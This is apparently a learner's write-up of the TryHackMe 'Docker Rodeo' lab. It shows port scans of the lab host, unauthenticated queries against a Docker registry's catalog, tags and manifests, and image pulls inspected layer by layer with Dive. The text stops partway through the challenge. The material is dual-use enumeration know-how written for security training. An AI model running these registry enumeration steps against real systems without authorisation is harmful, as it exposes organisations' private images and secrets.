---
Learn a wide variety of Docker vulnerabilities in this guided showcase.
---

# The Docker Rodeo — Writeup

## Overview
### The Docker Rodeo — Writeup
### The Docker Rodeo — Writeup
![777](https://assets.tryhackme.com/room-banners/DockerPrivEscRodeoBanner.png)
### 1. Preface: Setting up Docker for this Room (Deploy #1)
The prerequisites for this room are a bit more complicated then most rooms, however, I'll detail every step of the way.
1.1. Getting Setup
1.1.1. I strongly recommend using the TryHackMe AttackBox for this room for the most reliable experience.
1.1.2. Deploy the Instance attached to this room and wait for the IP address to be displayed.
Take note of  the IP address for your deployed Instance: MACHINE_IP
1.2. Add your Instance IP address to /etc/hosts
Once you have been given your IP address, you will need to create an entry in your /etc/hosts file with both the IP address and docker-rodeo.thm
1.2.1. sudo nano /etc/hosts
1.2.2. Add the entry so that it looks like the following:
MACHINE_IP    docker-rodeo.thm
![](https://assets.tryhackme.com/additional/docker-rodeo/t1/updatehosts.png)
1.2.3. Save and close the file.
1.3. Tell Docker to Trust your Instance
1.3.1. You will need to either create or enter the following into /etc/docker/daemon.json:
```text
{
  "insecure-registries" : ["docker-rodeo.thm:5000","docker-rodeo.thm:7000"]
}
```
![](https://assets.tryhackme.com/additional/docker-rodeo/t1/dockerdaemon.png)
1.3.2. Save and close the file.
1.4. Restart Docker
1.4.1. For the changes to apply, you will need to stop then start (not just restart) the Docker service:
```text
1.4.1. sudo systemctl stop docker
1.4.2. Wait for approximately 30 seconds
1.4.3. sudo systemctl start docker
```
You are now ready to progress with the room.

## Enumeration
```text
┌──(kali㉿kali)-[/etc/docker]
└─$ cat /etc/hosts  
10.10.148.19 webenum.thm
10.10.148.19 mysubdomain.webenum.thm
10.10.148.19 learning.webenum.thm
10.10.148.19 products.webenum.thm
10.10.148.19 Products.webenum.thm
10.10.67.130 wpscan.thm
10.10.142.247 blog.thm
10.10.138.76 erit.thm
10.10.223.238 docker-rodeo.thm
```
```text
┌──(kali㉿kali)-[~]
└─$ cd /etc/docker
```
```text
┌──(kali㉿kali)-[/etc/docker]
└─$ ls     
key.json

┌──(root㉿kali)-[/etc/docker]
└─# nano daemon.json
                                                                                     
┌──(root㉿kali)-[/etc/docker]
└─# cat daemon.json 
{
 "insecure-registries":["docker-rodeo.thm:5000","docker-rodeo.thm:7000"]
}
```
```text
┌──(kali㉿kali)-[/etc/docker]
└─$ sudo systemctl stop docker 
Warning: Stopping docker.service, but it can still be activated by:
  docker.socket
```
```text
┌──(kali㉿kali)-[/etc/docker]
└─$ sudo systemctl start docker
```
### 2. Introduction to Docker
2.1. What is Docker?
Starting in 2013, Docker was introduced to solve the costly and time-consuming process of application development and service delivery. Docker employs what is currently a "hot potato" topic for developers: containerization, this technology separates applications into their own containers, where they share the resources of, but interact with the operating system independently of each other.
Docker:
Is extremely portable, if a computer can run Docker, it can run a Docker container. This means that developers only have to write the application once for multiple devices - a very big headache solved!
Has a considerably less resource usage per-container then Virtual Machines (VMs) I.e. RAM and CPU (we'll come onto this later)
Allows you to set up a complex environment in a few simple steps through Dockerfiles (again, we'll come onto this later)
Is most importantly, very lucrative to a pentester as containerization has been so widely adopted in information technology today.
2.2. What are Docker "containers" & why are they used?
As we previously mentioned, containers share computing resources but remain isolated enough to not conflict with one another via the Docker engine. These containers don't run a fully-fledged operating system, unlike a VM. Let's look at the diagram below for a better picture:
![](https://assets.tryhackme.com/additional/docker-rodeo/t2/docker%20containers2.png)
We can see three containers running their own applications with no virtualisation. The three applications are isolated from one another, but use the main operating system's resources. Whereas, in comparison to running these applications in virtual machines:
![](https://assets.tryhackme.com/additional/docker-rodeo/t2/vm-layers3.png)
The "Guest Operating System" is where the resources are used up. For example,  a recommended minimum install size of Ubuntu is 20gb, if you were to run this for three applications, you'd require 60GB of storage. Whereas, a Ubuntu Docker image has the base size of around 180MB~. Containers can share base images too! Extremely space-efficient.
2.3. What are Docker Images?
Explaining the details of how docker containers are made aren't a requirement of this room. We do, however, need to understand some basic principles for later tasks. Docker containers are created from Docker images; consider these images as instruction manuals telling you how to assemble a piece of furniture.
These files contain commands such as RUN and COPY that will be executed by the container. RUN commands will execute system commands such as apt-get or ls /home/
![](https://assets.tryhackme.com/additional/docker-rodeo/t2/docker-image.png)
Does Docker run on a Hypervisor? (Yay/Nay)
Look back at the the diagrams explaining the OS abstraction levels!
*Nay*

## Exploitation
This task is a divider, please proceed onto the next task.
### 3.1. What is a Docker Registry?
Before we begin exploiting a Docker Registry, we need to first understand not only how we interact with them, but as to why they are so lucrative for us pentesters.
If you're familiar with [Git](https://git-scm.com/) and services such as [GitHub](https://github.com/) and [Gitlab](https://about.gitlab.com/), this'll be a breeze. However, let's explain a bit further to ensure we're all on the same page.
Docker Registries, at their fundamental, are used to store and provide published Docker images for use. Using repositories, creators of Docker images can switch between multiple versions of their applications and share them with other people with ease.
Public registries such as DockerHub exist, however, many organisations using Docker will host their own "private" registry.
Take for example the [RustScan DockerHub](https://hub.docker.com/repository/docker/rustscan/rustscan) registry. The developers have created a "tag" for every version of RustScan. As this is public, anyone can switch between the version of RustScan that they want to use with ease by downloading the image for the tag they want to use.
```text
┌──(kali㉿kali)-[~]
└─$ rustscan --version                                    
rustscan 2.0.0
```
```text
┌──(kali㉿kali)-[~]
└─$ nmap --version                       
Nmap version 7.92 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.6 openssl-3.0.5 libssh2-1.10.0 libz-1.2.11 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select

──(kali㉿kali)-[~]
└─$ sudo apt install nmap 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  ncat nmap-common
Suggested packages:
  ndiff zenmap
The following packages will be upgraded:
  ncat nmap nmap-common
3 upgraded, 0 newly installed, 0 to remove and 513 not upgraded.
Need to get 6,676 kB of archives.
After this operation, 424 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://http.kali.org/kali kali-rolling/non-free amd64 ncat amd64 7.93+dfsg1-0kali1 [490 kB]
Get:2 http://http.kali.org/kali kali-rolling/non-free amd64 nmap amd64 7.93+dfsg1-0kali1 [2,022 kB]
Get:3 http://http.kali.org/kali kali-rolling/non-free amd64 nmap-common all 7.93+dfsg1-0kali1 [4,164 kB]
Fetched 6,676 kB in 2s (4,243 kB/s)    
(Reading database ... 404253 files and directories currently installed.)
Preparing to unpack .../ncat_7.93+dfsg1-0kali1_amd64.deb ...
Unpacking ncat (7.93+dfsg1-0kali1) over (7.92+dfsg2-1kali1+b1) ...
Preparing to unpack .../nmap_7.93+dfsg1-0kali1_amd64.deb ...
Unpacking nmap (7.93+dfsg1-0kali1) over (7.92+dfsg2-1kali1+b1) ...
Preparing to unpack .../nmap-common_7.93+dfsg1-0kali1_all.deb ...
Unpacking nmap-common (7.93+dfsg1-0kali1) over (7.92+dfsg2-1kali1) ...
Setting up ncat (7.93+dfsg1-0kali1) ...
Setting up nmap-common (7.93+dfsg1-0kali1) ...
Setting up nmap (7.93+dfsg1-0kali1) ...
Processing triggers for man-db (2.10.2-3) ...
Processing triggers for kali-menu (2022.4.1) ...
Scanning processes...                                                                
Scanning processor microcode...                                                      
Scanning linux images...                                                             

Running kernel seems to be up-to-date.

The processor microcode seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```
```text
┌──(kali㉿kali)-[~]
└─$ nmap --version
Nmap version 7.93 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.6 openssl-3.0.5 libssh2-1.10.0 libz-1.2.11 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select

Yep! Rustscan works again for me 😊
```
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.223.238 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.223.238:22
Open 10.10.223.238:2233
Open 10.10.223.238:2244
Open 10.10.223.238:2255
Open 10.10.223.238:2375
Open 10.10.223.238:5000
Open 10.10.223.238:7000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 11:12 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating Ping Scan at 11:12
Scanning 10.10.223.238 [2 ports]
Completed Ping Scan at 11:12, 0.32s elapsed (1 total hosts)
Initiating Connect Scan at 11:12
Scanning docker-rodeo.thm (10.10.223.238) [7 ports]
Discovered open port 2244/tcp on 10.10.223.238
Discovered open port 5000/tcp on 10.10.223.238
Discovered open port 2233/tcp on 10.10.223.238
Discovered open port 7000/tcp on 10.10.223.238
Discovered open port 2255/tcp on 10.10.223.238
Discovered open port 2375/tcp on 10.10.223.238
Discovered open port 22/tcp on 10.10.223.238
Completed Connect Scan at 11:12, 0.32s elapsed (7 total ports)
Initiating Service scan at 11:12
Scanning 7 services on docker-rodeo.thm (10.10.223.238)
Completed Service scan at 11:13, 44.40s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.223.238.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 11.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 1.28s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
Nmap scan report for docker-rodeo.thm (10.10.223.238)
Host is up, received conn-refused (0.32s latency).
Scanned at 2022-10-25 11:12:21 EDT for 58s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fdd039ac0608f28fc301bc5394a381dd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyWJO/e6RoZm8B/GvOqyKXF8yOm5tw/DMPw6CwkMyxJv1IITVDg7vRmvEpL5gd7nmf+8z9V2w56p0Y9IoRB6yUd2pGxPnxLnzn+tkmR/kbFkXwKCiHM9p+0rf2Z/B16JyMyLY4BzmGmDWaBTutFgfqYMrJ5yRgM9Uqo1GF1cb2BUoPjgusafPYNpRU3c2hXaVvOwKx0oXtHKmyVcmH1geRsOQ5evZowvowetbDLYf+X8+BkGJ6h6ge5K0y+E1SOatumwKtXs9P3UjzCvmZLeYInJvQeHtyzWG96aZooAUQFJ04sS+LHYINSbm4uDcOILRx8hadhj8meGX76KamOrjT
|   256 36624b1f9b3c6f22cca93aae987a3ed3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEkuuS2jOZTEaQKxb5P12mhLDDpyrNRuytd810EFMewKuNfwka5ARI4lraPda+T2s3tpkWYNcfKJr2bCelmV7Xc=
|   256 f2cb82b5bae6f086cdb53061e4d3ca96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPrpwpt6doF7ocHG14+wUzL/r5cooC5ef30WDqXZDWag
2233/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0699f6a0b93f8441d154fdafba13686c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiRwKcIWTfA6BN5G46wzJ2WEGp0g8PFJyLOvJwDZAw8uaItzJUt9VtfZBF69Mm9MqTcnHDnH4Z8FocY1TU9DwJRxctIEvmiTxncjJcHIliI27XwgQxWoYM7aPkHVQCiqpawyftNkes59flfKqiA8i7aVz/a9WVv3pEWoJfKgDTw+zaFba9fbnqTPeUZVhKVxuWuftdUp9dtoUcGyui2DaUrTPTb6ZySihkIjlTfjjbZjY90H1ukv1vs7/ebIDgc35p7/1F6jYSGUn0xsTfLH18u2ensDkHqzzsR7NntkY7K1m1iR9cyZ2ss93b4hm4EC+ChfzsEJnwy0JaB0qztFE7
|   256 9269574236a5c6499634b09a86486dae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPi5xfZGsTO2qlTRLii2yDxNhpBTdJ/zHCK25b+POUaysl/zcXDY7dmRFyHRcdgFVZDF8mzqWJMAzOdQVtyBz8s=
|   256 c15fd6962d28b8d4f50f4d6a60b6b93c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN++8fEn7VV2VkKnyrUoupCho0NQidPDQ4wGTMDBUmnC
2244/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1968632c1b344d61951565ae1f1a48f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDML947breANePfvUVjI5Who3YnozxtqPfSWYElIDI7mgxzpn1hJSZnY17VEvBi90PRjkg7X2l1nCKX48A7wyY4rkLGTBO/sMLVrylbQDVOG5RPG4vmnZXs3acRwRr5m15YV7OEYc6WycQaMaElUfy06WQI+cCv9wGUV0Xkz4xN+gDT0r34KLUEHrzN1R478QxoRX+rrAdHj6j6vDXCizGwWBPqJSeOBz7mspgVSN0aYjyN0EEPGi7MOmkL1i6E2Pvv17g4Zv7XD7UVzu+eSZzOt0wjPVgwkFXapYK7wnA5Rq3EEX/61EszSw4c+sgLEuGWjIY8I3Mo/IZqY/jCPozj
|   256 81c81a94a329a700338980e735b676de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZqllWCjU44z6Ho/Klb55xcniFu7VomYL0mtptJjIIJMH+XeCJ7USG+BWA/OM6qfSkOpmHRqQyWmq5tukju+2s=
|   256 799eff97f16c151569a760d55c9b77a4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINCxlu7Ftjbaq1lJ/2b2XmExm6tI/DewMAVvT6A8VvsE
2255/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0699f6a0b93f8441d154fdafba13686c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiRwKcIWTfA6BN5G46wzJ2WEGp0g8PFJyLOvJwDZAw8uaItzJUt9VtfZBF69Mm9MqTcnHDnH4Z8FocY1TU9DwJRxctIEvmiTxncjJcHIliI27XwgQxWoYM7aPkHVQCiqpawyftNkes59flfKqiA8i7aVz/a9WVv3pEWoJfKgDTw+zaFba9fbnqTPeUZVhKVxuWuftdUp9dtoUcGyui2DaUrTPTb6ZySihkIjlTfjjbZjY90H1ukv1vs7/ebIDgc35p7/1F6jYSGUn0xsTfLH18u2ensDkHqzzsR7NntkY7K1m1iR9cyZ2ss93b4hm4EC+ChfzsEJnwy0JaB0qztFE7
|   256 9269574236a5c6499634b09a86486dae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPi5xfZGsTO2qlTRLii2yDxNhpBTdJ/zHCK25b+POUaysl/zcXDY7dmRFyHRcdgFVZDF8mzqWJMAzOdQVtyBz8s=
|   256 c15fd6962d28b8d4f50f4d6a60b6b93c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN++8fEn7VV2VkKnyrUoupCho0NQidPDQ4wGTMDBUmnC
2375/tcp open  docker  syn-ack Docker 19.03.13 (API 1.40)
| docker-version: 
|   ApiVersion: 1.40
|   Os: linux
|   MinAPIVersion: 1.12
|   Components: 
|     
|       Details: 
|         GoVersion: go1.13.15
|         Os: linux
|         MinAPIVersion: 1.12
|         BuildTime: 2020-09-16T17:01:06.000000000+00:00
|         GitCommit: 4484c46d9d
|         KernelVersion: 4.15.0-123-generic
|         Experimental: false
|         ApiVersion: 1.40
|         Arch: amd64
|       Version: 19.03.13
|       Name: Engine
|     
|       Details: 
|         GitCommit: 8fba4e9a7d01810a393d5d25a3621dc101981175
|       Version: 1.3.7
|       Name: containerd
|     
|       Details: 
|         GitCommit: dc9208a3303feef5b3839f4323d9beb36df0a9dd
|       Version: 1.0.0-rc10
|       Name: runc
|     
|       Details: 
|         GitCommit: fec3683
|       Version: 0.18.0
|       Name: docker-init
|   GitCommit: 4484c46d9d
|   BuildTime: 2020-09-16T17:01:06.000000000+00:00
|   KernelVersion: 4.15.0-123-generic
|   Platform: 
|     Name: Docker Engine - Community
|   Version: 19.03.13
|   GoVersion: go1.13.15
|_  Arch: amd64
5000/tcp open  http    syn-ack Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
7000/tcp open  http    syn-ack Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Linux, linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.96 seconds
```
![](https://assets.tryhackme.com/additional/docker-rodeo/t3/rustscan.png)
I could simply do docker pull rustscan/rustscan:1.8.0 to use version 1.8.0 of RustScan, or I could use docker pull rustscan/rustscan:latest for the most recent update. For a Docker repository to do this, the repository must store the data about every tag - this is what we'll be exploiting.
Since Docker images are essentially just instruction manuals as we discussed earlier, they can be reversed to understand what commands took place when the image was being built - this information is stored in layers...We will come onto unpacking these layers in Task 4.
```text
docker pull rustscan/rustscan:1.8.0

 docker pull rustscan/rustscan:latest
```
```text
┌──(kali㉿kali)-[~]
└─$ sudo docker pull rustscan/rustscan:latest 
[sudo] password for kali: 
latest: Pulling from rustscan/rustscan
339de151aab4: Pull complete 
b393a686621b: Pull complete 
3cf8a394b878: Pull complete 
Digest: sha256:8ec1f92163e51259b9da5d7ebddb7973074cf7a014447547417e5ff278e24bec
Status: Downloaded newer image for rustscan/rustscan:latest
docker.io/rustscan/rustscan:latest

I've learnt about Docker registries
```
### 3.2. Interacting with a Docker Registry
As with any system that we are going to be penetration testing, we need to enumerate the services running to understand any potential entry points. In our case, Docker Registry runs on port 5000 by default, however, this can be easily changed, so it is worth confirming via with a nmap scan like so:
```text
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV 10.10.223.238                       
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 11:37 EDT
Nmap scan report for docker-rodeo.thm (10.10.223.238)
Host is up (0.33s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Docker Registry (API: 2.0)
7000/tcp open  http    Docker Registry (API: 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.14 seconds
```
![](https://i.imgur.com/rz4orgs.png)
Not only is Nmap capable of discovering the Docker Registry, but also the API version - this is important to note for how we will interact with it.
JavaScript Object Notation is an open standard file and data interchange format that uses human-readable text to store and transmit data objects consisting of attribute–value pairs and arrays.
The Docker Registry is a JSON endpoint, so we cannot just simply interact with it like we would a normal website - we will have to query it. Whilst this can be done via the terminal or browser, dedicated tools such as [Postman](https://www.postman.com/downloads/) or [Insomnia](https://insomnia.rest/download) are much better suited for the job. I will be using Postman in this room.
To understand what routes are available to us, we need to read the [Docker Registry Documentation](https://docs.docker.com/registry/spec/api/). Please take the time to read this at your leisure.
3.2.1. Discovering Repositories
We need to send a GET request to http://docker-rodeo.thm:5000/v2/_catalog to list all the repositories registered on the registry.
```text
installing postman in kali linux
go to postman and download tar
https://genesis-z.github.io/postman-in-kali/
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ tar xvzf ~/Downloads/postman*.tar.gz -C /tmp/
.........................
Postman/app/locales/ja.pak
Postman/app/locales/he.pak
Postman/app/locales/ru.pak
Postman/Postman
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cd /tmp
```
```text
┌──(kali㉿kali)-[/tmp]
└─$ ls
Postman
```
```text
┌──(kali㉿kali)-[/tmp/Postman]
└─$ sudo chown -R root:root /tmp/Postman 
[sudo] password for kali:
```
```text
┌──(kali㉿kali)-[/tmp/Postman]
└─$ sudo mv /tmp/Postman /opt/
```
```text
┌──(kali㉿kali)-[/tmp/Postman]
└─$ sudo ln -s /opt/Postman/app/Postman /usr/local/bin/Postman
```
```text
┌──(kali㉿kali)-[/tmp/Postman]
└─$ Postman
The disableGPU setting is set to undefined
Not disabling GPU

after creating ur account

using postman

GET         http://docker-rodeo.thm:5000/v2/_catalog 

{
    "repositories": [
        "cmnatic/myapp1",
        "dive/challenge",
        "dive/example"
    ]
}
```
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/catalog1.png)
![[Pasted image 20221025110526.png]]
In this example, we're given a response of three repositories. For now, we are only going to focus on "cmnatic/myapp1".
Before we can begin analysing a repository, we need two key pieces of information:
1. The repository name
2. Any repository tag(s) published
We currently have the repository name (cmnatic/myapp1) now we just need to list all tags that have been published. Every repository will have a minimum of one tag. This tag is the "latest" tag, but there can be many tags, all with different code, for example, major software versions or two tags for "production" and "development".
Send a GET request to http://docker-rodeo.thm:5000/v2/repository/name/tags/list to query all published tags. For our application, our request would look like so: http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list:
```text
getting tags

GET          http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list

{
    "name": "cmnatic/myapp1",
    "tags": [
        "notsecure",
        "latest",
        "secured"
    ]
}
```
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/listingtags.png)
![[Pasted image 20221025110840.png]]
Note here we have three tags? That "notsecure" tag sure sounds interesting. We now have both pieces of information to retrieve the manifest files of the image for analysis.
3.2.2. Grabbing the Data!
With these two important pieces of information about a repository known, we can enumerate that specific repository for a manifest file. This manifest file contains various pieces of information about the application, such as size, layers and other information. I'm going to grab the manifest file for the "notsecure" tag via the following GET request: http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure
We'll be following on from the previous vulnerability outlined in Task 3. "Abusing a Docker Registry".
As we've discovered, we are able to query the Docker registry and the data contained within without needing to authenticate.
Not only can we query Docker registries, but a fundamental feature of Docker is being able to download these repositories for someone to use themselves. This is known as an image; tools such as Dive to reverse engineer these images that we download.
Without doing it justice, [Dive](https://github.com/wagoodman/dive) acts as a man-in-the-middle between ourselves and Docker when we use it to run a container. Dive monitors and reassembles how each layer is created and the containers file system at each stage.
We'll start off with an example. Let's download a Docker image from our vulnerable repository and starting diving in.
4.1. [Install Dive](https://github.com/wagoodman/dive#installation) from their official GitHub
4.2. Download the Docker image we are going to decompile using docker pull docker-rodeo.thm:5000/dive/example
Note: If you receive this warning:
Error response from daemon: Get https://docker-rodeo.thm:5000/v2/: http: server gave HTTP response to HTTPS client
you need to revisit Step 1 in the first task of this room and then restart your Computer to ensure Docker has properly restarted.
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/pullerror.png)
```text
┌──(kali㉿kali)-[~]
└─$ sudo docker pull docker-rodeo.thm:5000/dive/example
Using default tag: latest
latest: Pulling from dive/example
bb79b6b2107f: Pull complete 
563c5c58c7e4: Pull complete 
d0bfbff8c909: Pull complete 
cadf54e21bb7: Pull complete 
4b40ce202545: Pull complete 
8344f1c4be8e: Pull complete 
6beebab80685: Pull complete 
Digest: sha256:7293ed88421ff1823a51d4d80eb98d5b55a1fdeda5ae91b043a9cdf621ed8184
Status: Downloaded newer image for docker-rodeo.thm:5000/dive/example:latest
docker-rodeo.thm:5000/dive/example:latest
```
4.3. Find the IMAGE_ID of the repository image that we have downloaded in Step 2:
4.3.1. run docker images and look for the name of the repository we downloaded docker-rodeo.thm:5000/dive/example
4.3.2. The "IMAGE_ID" is the value in the third column:
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/diveexample-id.png)
In this case, it is "398736241322" for me.
```text
┌──(kali㉿kali)-[~]
└─$ sudo docker images                                 
REPOSITORY                           TAG       IMAGE ID       CREATED         SIZE
blockchain-demo                      latest    aa0a2a620e24   2 months ago    183MB
node                                 alpine    16b18c065537   2 months ago    166MB
rustscan/rustscan                    latest    32635bbf7b6c   15 months ago   41.7MB
docker-rodeo.thm:5000/dive/example   latest    398736241322   2 years ago     87.1MB
```
4.4 Start dive by running dive and provide the "IMAGE_ID" of the image we want to decompile. For example: dive 398736241322
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive.png)
```text
installing dive

──(kali㉿kali)-[~]
└─$ wget https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb
sudo apt install ./dive_0.9.2_linux_amd64.deb

──(kali㉿kali)-[~]
└─$ dive 398736241322
Image Source: docker://398736241322
Fetching image... (this can take a while for large images)
Handler not available locally. Trying to pull '398736241322'...
Using default tag: latest
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/images/create?fromImage=398736241322&tag=latest": dial unix /var/run/docker.sock: connect: permission denied
cannot fetch image
exit status 1
```
```text
┌──(kali㉿kali)-[~]
└─$ sudo dive 398736241322                                                          

Image Source: docker://398736241322
Fetching image... (this can take a while for large images)
Analyzing image...
Building cache...
```
4.5. Using Dive
Dive is a little overwhelming at first, however, it quickly makes sense. We have four different views, we are only interested in these three views:
4.5.1. Layers (pictured in red)
4.5.1.1. This window shows the various layers and stages the docker container has gone through
4.6.1. Current Layer Contents (pictured in green)
4.6.1.1. This window shows you the contents of the container's filesystem at the selected layer
4.7.1. Layer Details (pictured in red)
4.7.1.1. Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer.
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive2.png)
Navigate the data within the current window using the "Up" and "Down" Arrow-keys.
You can swap between the Windows using the "Tab" key.
4.8. Disassembling Our First Image in Dive
Looking at the "Layers" window in the top-left, we can see a total of 7 individual layers
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive3.png)
![[Pasted image 20221025120012.png]]
Note how we can see the commands executed by the container when the image is being built in the "Layers" panel.
For example, take a look at the first layer then press the "Tab" key to switch windows and scroll down (using the arrow keys) to the "home" directory in "Current Layer Contents" and then press the "Tab" key again to switch back to the "Layers" window.
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive4.png)
![[Pasted image 20221025120517.png]]
At the 1st layer, there is nothing located in "/home" (highlighted in green in the above screenshot) on the container. However, if we were to proceed to the 2nd layer, the command mkdir -p /home/user is executed, and now we can see the directory "/home/user" (highlighted in red) has now been made on the container.
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive5.png)
4.9. Challenge
Pull the challenge image using docker pull docker-rodeo.thm:5000/dive/challenge and apply what we have done above for the questions below.
Remember! You will need to use docker images to get the "IMAGE_ID" for the new image and use that with the dive command.
```text
Challenge
```
```text
┌──(kali㉿kali)-[~]
└─$ sudo docker pull docker-rodeo.thm:5000/dive/challenge
Using default tag: latest
latest: Pulling from dive/challenge
171857c49d0f: Pull complete 
419640447d26: Pull complete 
61e52f862619: Pull complete 
eafe19b950d0: Pull complete 
039ca94db37a: Pull complete 
e28b2366e7c0: Pull complete 
11f4fb102c71: Pull complete 
Digest: sha256:154c868d6a74651a464ec131b43dec89bd4adf4760cdc83d32dbc8d401ee4a11
Status: Downloaded newer image for docker-rodeo.thm:5000/dive/challenge:latest
docker-rodeo.thm:5000/dive/challenge:latest
```
```text
┌──(kali㉿kali)-[~]
└─$ docker images    
